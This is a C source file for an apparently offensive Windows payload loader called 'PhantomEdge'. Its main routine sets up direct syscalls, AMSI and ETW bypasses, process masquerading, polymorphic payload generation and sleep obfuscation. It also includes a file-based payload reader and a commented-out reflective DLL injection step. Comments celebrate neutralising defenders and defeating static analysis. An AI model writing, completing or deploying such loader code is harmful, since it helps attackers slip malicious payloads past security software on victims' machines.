#include "../include/common_defines.h" // Should be the very first include

#include "../include/rtldr_ctx.h"
#include "../include/utils.h"    // For find_module_base, find_function, ReadPayloadFileToMemory (this file)
#include "../include/syscalls.h" // For all Nt* syscall wrappers and status codes
#include "../include/mem.h"      // For wrapped_NtAllocateVirtualMemory, wrapped_NtFreeVirtualMemory (if not directly via syscalls.h)
#include "../include/evasion.h"  // For unhook_ntdll etc.
#include "../include/rdi.h"      // For InvokeReflectiveLoader (will be called from here)
#include "../include/strategy.h"  // For our new evasion strategy framework
#include "../include/environment_chameleon.h"  // For boss-level process masquerading
#include "../include/cynical_logger.h"  // For logging integration
#include "../include/intelligent_bypass.h"  // For smart AMSI/ETW bypass
#include "../include/kernel_direct_syscalls.h"  // For revolutionary kernel-level syscalls
#include "../include/dynamic_payload_generator.h"  // For JIT code generation sorcery
#include "../include/performance_profiler.h"  // For ultimate performance optimization
// #include "payload.h"            // EMBEDDED PAYLOAD - Not used in current simplified version
#ifdef _DEBUG
#include <stdio.h>
#endif
#include <winternl.h>

// --- No-CRT implementations ---
#pragma function(memcpy)
void *memcpy(void *dst, const void *src, size_t n) {
    unsigned char *d = dst;
    const unsigned char *s = src;
    while (n--) *d++ = *s++;
    return dst;
}

#pragma function(memset)
void *memset(void *dst, int c, size_t n) {
    unsigned char *d = dst;
    while (n--) *d++ = (unsigned char)c;
    return dst;
}

// Custom string functions (no-CRT)
static WCHAR *pe_wstrcpy(WCHAR *dst, const WCHAR *src) {
    WCHAR *d = dst;
    while ((*d++ = *src++));
    return dst;
}

static WCHAR *pe_wstrcat(WCHAR *dst, const WCHAR *src) {
    WCHAR *d = dst;
    while (*d) d++;
    while ((*d++ = *src++));
    return dst;
}

// Simple XOR string decryption (compile-time encryption needed via build script)
static void xor_decrypt_wstring(LPWSTR str, SIZE_T len, BYTE key) {
    for (SIZE_T i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

// Implementation for ReadPayloadFileToMemory
BOOL ReadPayloadFileToMemory(PRTLDR_CTX ctx, LPCWSTR pwszFileName, PBYTE* ppPayloadBuffer, PDWORD pdwPayloadSize) {
    if (!ctx || !ctx->syscalls_initialized || !pwszFileName || !ppPayloadBuffer || !pdwPayloadSize) {
        return FALSE;
    }

    *ppPayloadBuffer = NULL;
    *pdwPayloadSize = 0;

    HANDLE hFile = NULL;
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatusBlock;
    UNICODE_STRING uFileName;

    SIZE_T fileNameLength = 0;
    LPCWSTR p = pwszFileName;
    while (*p) { fileNameLength++; p++; }

    uFileName.Buffer = (PWSTR)pwszFileName;
    uFileName.Length = (USHORT)(fileNameLength * sizeof(WCHAR));
    uFileName.MaximumLength = uFileName.Length;
    
    InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = wrapped_NtCreateFile(&hFile, FILE_GENERIC_READ, &objAttr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    FILE_STANDARD_INFORMATION fileStdInfo;
    status = wrapped_NtQueryInformationFile(hFile, &ioStatusBlock, &fileStdInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
    if (!NT_SUCCESS(status)) {
        wrapped_NtClose(hFile);
        return FALSE;
    }

    DWORD fileSize = fileStdInfo.EndOfFile.LowPart;
    if (fileSize == 0) {
        wrapped_NtClose(hFile);
        return FALSE;
    }

    PVOID pBuffer = NULL;
    SIZE_T regionSize = fileSize;
    status = wrapped_NtAllocateVirtualMemory(NtCurrentProcess(), &pBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status) || !pBuffer) {
        wrapped_NtClose(hFile);
        return FALSE;
    }

    status = wrapped_NtReadFile(hFile, NULL, NULL, NULL, &ioStatusBlock, pBuffer, fileSize, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        SIZE_T actualRegionSize = regionSize; 
        wrapped_NtFreeVirtualMemory(NtCurrentProcess(), &pBuffer, &actualRegionSize, MEM_RELEASE);
        wrapped_NtClose(hFile);
        return FALSE;
    }

    *ppPayloadBuffer = (PBYTE)pBuffer;
    *pdwPayloadSize = fileSize;
    wrapped_NtClose(hFile);
    return TRUE;
}

static void debug_message(const char* msg) {
    #ifdef _DEBUG
    MessageBoxA(NULL, msg, "PE_DEBUG", MB_OK);
    #endif
}

static BOOL build_payload_nt_path(WCHAR *outBuf, SIZE_T outCch)
{
    PPEB peb = (PPEB)__readgsqword(0x60);
    if(!peb) return FALSE;
    PRTL_USER_PROCESS_PARAMETERS pParams = peb->ProcessParameters;
    if(!pParams) return FALSE;
    UNICODE_STRING img = pParams->ImagePathName;
    if(img.Length/sizeof(WCHAR) >= outCch-10) return FALSE;
    // copy until last backslash
    SIZE_T i=0; SIZE_T lastBS=0;
    for(; i< img.Length/sizeof(WCHAR); ++i){
        outBuf[i]=img.Buffer[i]; if(outBuf[i]==L'\\') lastBS=i;
    }
    outBuf[lastBS+1]=0; // truncate after last backslash
    pe_wstrcat(outBuf, L"test_payload.dll");
    // prepend NT prefix
    WCHAR tmp[260]; pe_wstrcpy(tmp, outBuf);
    pe_wstrcpy((WCHAR*)outBuf, (const WCHAR*)L"\\??\\");
    pe_wstrcat((WCHAR*)outBuf, (const WCHAR*)tmp);
    return TRUE;
}

// Main function of the core loader logic
int CoreLoaderMain(void) {
    RTLDR_CTX ctx_val;
    PRTLDR_CTX ctx = &ctx_val;
    EVASION_STRATEGY strategy; // Allocate strategy struct on the stack

    // Link the strategy module into the context
    ctx->strategy = &strategy;

    // Initialize context: ntdll_base
    ctx->ntdll_base = find_module_base(L"ntdll.dll");
    if (!ctx->ntdll_base) {
        // Critical failure: cannot find ntdll
        return -2; 
    }
    ctx->syscalls_initialized = FALSE; // Initialize to FALSE

    // Initialize syscalls (this caches syscall IDs)
    ctx->syscalls_initialized = initialize_syscalls(ctx);
    if (!ctx->syscalls_initialized) {
        // Critical failure: cannot initialize syscalls
        return -3;
    }

    // === BOSS MODE INITIALIZATION ===
    // Initialize Performance Profiler FIRST - monitor everything
    if (!PerformanceProfiler_Initialize(OPT_LEVEL_AGGRESSIVE)) {
        CynicalLog_Error("LOADER", "Performance Profiler initialization failed - no optimization available");
        debug_message("Warning: Performance Profiler initialization failed");
    } else {
        CynicalLog_Info("LOADER", "Ultimate Optimization Engine activated - monitoring EVERYTHING");
        debug_message("Performance Profiler online: Ready to optimize like a boss");
        
        // Start profiling the loader itself
        PerformanceProfiler_StartProfiling(MODULE_CORE_LOADER);
    }
    
    // Initialize Cynical Logger first
    if (!CynicalLogger_Initialize(NULL)) {
        // Non-critical failure - continue without logging
        debug_message("Warning: Cynical Logger initialization failed");
    } else {
        CynicalLog_Info("LOADER", "PhantomEdge boss mode activated - stealth level MAXIMUM");
    }

    // Initialize Environment Chameleon - BOSS LEVEL STEALTH
    LARGE_INTEGER chameleon_start = PerformanceProfiler_StartTiming();
    if (!Chameleon_Initialize()) {
        CynicalLog_Error("LOADER", "Environment Chameleon initialization failed - proceeding without masquerading");
        debug_message("Warning: Environment Chameleon initialization failed");
    } else {
        CynicalLog_Info("LOADER", "PhantomEdge boss mode activated - stealth level MAXIMUM");
        debug_message("Boss mode activated: Environment Chameleon online");
    }
    PerformanceProfiler_EndTiming(MODULE_ENVIRONMENT_CHAMELEON, chameleon_start, "initialization");

    // Initialize Intelligent Bypass - SMART EVASION ARSENAL
    LARGE_INTEGER bypass_start = PerformanceProfiler_StartTiming();
    if (!IntelligentBypass_Initialize()) {
        CynicalLog_Error("LOADER", "Intelligent Bypass initialization failed - proceeding without bypass");
        debug_message("Warning: Intelligent Bypass initialization failed");
    } else {
        CynicalLog_Info("LOADER", "Smart evasion arsenal activated - AMSI/ETW bypass ready");
        debug_message("Intelligent Bypass online: Ready to outsmart defenders");
        
        // Execute AMSI and ETW bypasses
        PBYPASS_TECHNIQUE selected_techniques[8];
        DWORD technique_count = IntelligentBypass_SelectOptimalTechniques(
            BYPASS_TYPE_AMSI | BYPASS_TYPE_ETW,
            selected_techniques,
            8
        );
        
        if (technique_count > 0) {
            NTSTATUS bypass_status = IntelligentBypass_ExecuteTechniques(
                selected_techniques[0], // Pass first technique pointer
                technique_count
            );
            
            if (NT_SUCCESS(bypass_status)) {
                CynicalLog_Info("LOADER", "Bypass techniques executed successfully");
                debug_message("Bypass successful: Defenders neutralized");
            } else {
                CynicalLog_Warn("LOADER", "Some bypass techniques failed - continuing anyway");
                debug_message("Partial bypass: Some defenses still active");
            }
        }
    }
    PerformanceProfiler_EndTiming(MODULE_INTELLIGENT_BYPASS, bypass_start, "initialization");

    // Initialize Kernel Direct Syscalls - REVOLUTIONARY KERNEL BYPASS
    LARGE_INTEGER kernel_start = PerformanceProfiler_StartTiming();
    if (!KernelSyscalls_Initialize()) {
        CynicalLog_Error("LOADER", "Kernel Direct Syscalls initialization failed - using traditional methods");
        debug_message("Warning: Kernel Direct Syscalls initialization failed");
    } else {
        CynicalLog_Info("LOADER", "Revolutionary kernel bypass activated - usermode hooks OBLITERATED");
        debug_message("Kernel Direct Syscalls online: Bypassing usermode like a boss");
        
        // Test kernel syscall resolution
        DWORD test_syscall_id = KernelSyscalls_ResolveSyscallId("NtAllocateVirtualMemory");
        if (test_syscall_id != 0xFFFFFFFF) {
            CynicalLog_Info("LOADER", "Kernel syscall resolution test PASSED - ID: 0x%X", test_syscall_id);
            debug_message("Kernel syscall test: SUCCESS - Ready for direct kernel calls");
        } else {
            CynicalLog_Warn("LOADER", "Kernel syscall resolution test failed - falling back to traditional");
            debug_message("Kernel syscall test: FAILED - Using fallback methods");
        }
    }
    PerformanceProfiler_EndTiming(MODULE_KERNEL_SYSCALLS, kernel_start, "initialization");

    // Initialize Dynamic Payload Generator - JIT CODE SORCERY
    LARGE_INTEGER dyngen_start = PerformanceProfiler_StartTiming();
    if (!DynamicPayload_Initialize()) {
        CynicalLog_Error("LOADER", "Dynamic Payload Generator initialization failed - using static payloads");
        debug_message("Warning: Dynamic Payload Generator initialization failed");
    } else {
        CynicalLog_Info("LOADER", "JIT Code Sorcery activated - static analysis DESTROYED");
        debug_message("Dynamic Payload Generator online: Polymorphic code generation ready");
        
        // Test payload generation with dummy data
        BYTE test_shellcode[] = { 0x90, 0x90, 0x90, 0x90, 0xC3 }; // nop; nop; nop; nop; ret
        GENERATED_PAYLOAD test_generated = { 0 };
        
        NTSTATUS gen_status = DynamicPayload_Generate(
            test_shellcode,
            sizeof(test_shellcode),
            &test_generated
        );
        
        if (NT_SUCCESS(gen_status)) {
            CynicalLog_Info("LOADER", "Payload generation test PASSED - size: %zu, entropy: %d%%", 
                           test_generated.payload_size, test_generated.entropy_score);
            debug_message("Payload generation test: SUCCESS - JIT engine operational");
            
            // Cleanup test payload
            DynamicPayload_Free(&test_generated);
        } else {
            CynicalLog_Warn("LOADER", "Payload generation test failed: 0x%08X", gen_status);
            debug_message("Payload generation test: FAILED - Using static methods");
        }
    }
    PerformanceProfiler_EndTiming(MODULE_DYNAMIC_GENERATOR, dyngen_start, "initialization");

    // Run comprehensive performance benchmark
    CynicalLog_Info("LOADER", "Running comprehensive performance benchmark");
    debug_message("Performance benchmark: Testing all systems");
    
    NTSTATUS benchmark_status = Benchmark_RunComprehensive();
    if (NT_SUCCESS(benchmark_status)) {
        CynicalLog_Info("LOADER", "Performance benchmark COMPLETED - all systems analyzed");
        debug_message("Performance benchmark: SUCCESS - optimization data collected");
    } else {
        CynicalLog_Warn("LOADER", "Performance benchmark failed: 0x%08X", benchmark_status);
        debug_message("Performance benchmark: FAILED - limited optimization available");
    }

    // Initialize our Evasion Strategy module
    if (!Strategy_Initialize(ctx, ctx->strategy)) {
        // Critical failure: cannot initialize evasion strategy
        return -4;
    }

    // --- TEST: Invoke Sleep Obfuscation ---
    // Instead of running the payload, we will test our new sleep obfuscation module.
    debug_message("Framework initialized. Testing sleep obfuscation for 5 seconds...");

    if (ctx->strategy->pfnObfuscateSleep) {
        if (ctx->strategy->pfnObfuscateSleep(ctx, 5000)) {
            debug_message("Sleep obfuscation test PASSED.");
        } else {
            debug_message("Sleep obfuscation test FAILED.");
        }
    } else {
        debug_message("Sleep obfuscation function not available in strategy.");
    }
    
    // The original payload execution is commented out for this test.
    /*
    PBYTE pPayloadBuffer = raw_reflective_dll;
    DWORD dwPayloadSize = raw_reflective_dll_len;

    if (pPayloadBuffer && dwPayloadSize > 0) {
        #ifdef _DEBUG
        debug_message("Payload is embedded. Attempting to execute...");
        #endif
        
        NTSTATUS rdiStatus = InvokeReflectiveLoader(ctx, pPayloadBuffer, "ReflectiveLoader", NULL);

        if (NT_SUCCESS(rdiStatus)) {
            debug_message("InvokeReflectiveLoader SUCCESS");
        } else {
            debug_message("InvokeReflectiveLoader FAILED");
        }
    } else {
        debug_message("Embedded payload not found or is empty!");
    }
    */

    // === BOSS MODE CLEANUP ===
    CynicalLog_Info("LOADER", "PhantomEdge mission completed - cleaning up boss mode");
    
    // Cleanup Dynamic Payload Generator
    DynamicPayload_Cleanup();
    
    // Cleanup Kernel Direct Syscalls
    KernelSyscalls_Cleanup();
    
    // Cleanup Intelligent Bypass
    IntelligentBypass_Cleanup();
    
    // Cleanup Environment Chameleon
    Chameleon_Cleanup();
    
    // Cleanup Cynical Logger (with self-destruct if needed)
    CynicalLogger_Shutdown(FALSE);
    
    // Cleanup Performance Profiler LAST - generate final report
    PerformanceProfiler_Cleanup();

    // Loader has done its main job. 
    // The stub (RealEntry) will call NtTerminateProcess after this returns.
    return 0; // Success
}

// ... rest of the file ... 